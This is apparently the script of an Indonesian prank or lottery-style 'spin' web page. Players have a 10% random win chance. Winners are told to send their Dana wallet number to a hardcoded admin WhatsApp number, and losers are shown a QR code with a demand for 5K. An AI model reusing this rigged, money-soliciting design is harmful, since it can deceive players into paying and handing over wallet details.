const spin = document.getElementById("spin");
const hasil = document.getElementById("hasil");
const reward = document.getElementById("reward");
const qr = document.getElementById("qr");
const desc = document.getElementById("desc");

const bgMusic = document.getElementById("bgMusic");
const loseSound = document.getElementById("loseSound");
const winSound = document.getElementById("winSound");

const mascot = document.getElementById("mascot");
const claimBtn = document.getElementById("claimBtn");
const userNumber = document.getElementById("userNumber");

claimBtn.onclick = () => {

    const input = userNumber.value.trim();

    if (!input) {
        alert("Isi nomor dulu 😐");
        return;
    }

    // nomor WA KAMU (admin)
    const adminWA = "62895327994877";

    const text = `Gua menang wleee!
    Nomor user: ${input}`;

    const url = `https://wa.me/${adminWA}?text=${encodeURIComponent(text)}`;

    window.open(url, "_blank");
};

spin.onclick = () => {

    hasil.style.display = "block";
    hasil.innerHTML = "Menghitung keberuntungan...";

    spin.disabled = true;

    setTimeout(() => {

        let win = Math.random() < 0.1;

        spin.style.display = "none";
        desc.style.display = "none";

        bgMusic.pause();
        bgMusic.currentTime = 0;

        if (win) {

            hasil.innerHTML = "🎉 Jir Menang, Kirim aja Nomor Dana dah sini";
            reward.style.display = "block";

            // WIN MASCOT
            mascot.className = "mascot win";
            mascot.src = "assets/damn.gif";

            winSound.currentTime = 0;
            winSound.play().catch(() => {});

        } else {

            hasil.innerHTML = "😏 Oke Mana 5K mu Bosku";
            qr.style.display = "block";

            triggerLose();
        }

    }, 2500);
};

function triggerLose() {

    mascot.className = "mascot lose";
    mascot.src = "assets/yaha.jpg";

    bgMusic.volume = 0.1;

    loseSound.currentTime = 0;
    loseSound.play().catch(() => {});

    document.querySelector(".container").classList.add("lose");
}

window.addEventListener("load", () => {

    bgMusic.volume = 0.5;

    bgMusic.play().catch(() => {
        console.log("Autoplay diblokir browser.");
    });
});